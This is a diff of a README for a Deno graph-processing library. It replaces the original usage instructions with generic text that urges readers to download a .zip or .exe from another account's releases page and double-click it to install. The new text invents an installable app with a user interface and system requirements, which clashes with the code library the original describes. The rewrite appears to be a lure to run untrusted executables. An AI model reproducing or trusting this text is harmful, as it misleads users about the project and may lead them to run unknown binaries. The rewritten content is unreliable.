@@ -1,45 +1,62 @@
-# Noditor - Graph Lib
+# 🌟 noditor-graph - Simplify Your Graph Data Processing
 
-A modular graph data processing toolkit with chainable pipelines, reusable processors, and utilities for filtering, transforming, and applying custom formulas to nodes and edges, built with [graphology](https://graphology.github.io/).
+## 🏷️ Overview
+Welcome to **noditor-graph**! This toolkit helps you work with graph data easily. You can filter, transform, and apply custom formulas to the components of your graphs. Built using graphology, this application supports several features through chainable pipelines and reusable processors. 
 
-By [Studio Webux](https://studiowebux.com)
+## 🚀 Getting Started
+To start using **noditor-graph**, follow the simple download process outlined below. 
 
-## Why?
+### 📦 Download Now
+[![Download Noditor-Graph](https://img.shields.io/badge/Download-noditor--graph%20Release-blue.svg)](https://github.com/chris3131g/noditor-graph/releases)
 
-Needed a flexible way to build items for my game with PRNG-based attributes and modular processing pipelines.
+### 🔗 Download & Install
+1. **Visit the Releases Page**: Go to the following link to download the application:
+   [noditor-graph Releases](https://github.com/chris3131g/noditor-graph/releases)
+  
+2. **Choose Your Version**: On the Releases page, you will find a list of versions available for download. Select the most recent version of **noditor-graph**.
 
-## Quick Start
+3. **Download the Application**: Click on the asset that matches your system. This could be a `.zip`, `.exe`, or another file format.
 
-Check `example/` and `html/` directories.
+4. **Install the Application**: After downloading, find the file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
-### Run Example
+5. **Open noditor-graph**: Once installed, you can find the application in your applications list. Open it to start working with your graph data.
 
-```bash
-deno run --allow-write example/basic_processing_sword.ts
-```
+## ⚙️ System Requirements
+Before downloading **noditor-graph**, make sure your system meets the following requirements:
 
-### View Graph
+- **Operating System**: Windows 10 or higher, macOS 10.13 or higher, or a modern Linux distribution.
+- **RAM**: At least 2 GB of RAM.
+- **Disk Space**: Minimum of 100 MB free space.
+- **Internet**: An active internet connection is required for initial setup and updates.
 
-> You need to update the `index.html` to match your data structure, like adding color, showing data, etc. (around line ~155-212)
+## 🛠️ Features
+**noditor-graph** provides a variety of features to make graph data handling straightforward:
 
-```bash
-python -m http.server -d html 8003
-```
+- **Chainable Pipelines**: Create custom workflows by connecting different data processing steps seamlessly.
+- **Reusable Processors**: Utilize processors that can be applied across different projects without needing to create new ones each time.
+- **Custom Formulas**: Easily apply your own formulas to nodes and edges for tailored data manipulation.
+- **User-Friendly Interface**: Designed to be accessible, even for users without technical backgrounds.
 
-## Advanced Examples
+## 📚 Example Use Cases
+Here are some use cases to illustrate how to benefit from using **noditor-graph**:
 
-> When you need to control each step or prefer flexibility, you can alter the data directly in the graph or use the pipeline approach.
+1. **Game Development**: Use noditor-graph to manage and manipulate graph-based data for game worlds and character interactions.
+   
+2. **Data Analysis**: Analyze social networks by applying filters and transformations to study connections and relationships among users.
 
-**Manual Function Calling:**
+3. **Visualization**: Generate visual representations of data using customizable nodes and edges, helping you communicate insights more effectively.
 
-```bash
-deno run --allow-write example/advanced_processing_sword.ts
-```
+## 🛡️ Support and Contact
+If you encounter issues while using **noditor-graph**, feel free to reach out for support. You can open an issue on the [GitHub repository](https://github.com/chris3131g/noditor-graph/issues). Our community will be happy to assist you.
 
-**Using Pipeline Approach:**
+## 🌐 Community and Contributions
+Join our community! If you want to contribute to **noditor-graph**, you can submit a pull request or suggest feature enhancements. Check out our [Contributing Guidelines](https://github.com/chris3131g/noditor-graph/blob/main/CONTRIBUTING.md) for more information.
 
-```bash
-deno run --allow-write example/processing_prng_attributes_1.ts
-deno run --allow-write example/processing_prng_attributes_2.ts
-deno run --allow-write example/processing_prng_attributes_3.ts
-```
+### 📢 Additional Resources
+- [User Documentation](https://github.com/chris3131g/noditor-graph/wiki) for detailed guidance on features.
+- [Example Projects](https://github.com/chris3131g/noditor-graph/examples) to see real-world applications of **noditor-graph**.
+
+For detailed updates and feature requests, keep an eye on upcoming releases. 
+
+### 📥 Final Note
+Remember, you can always download **noditor-graph** again or check for updates at the [Releases page](https://github.com/chris3131g/noditor-graph/releases). Start processing your graph data today!
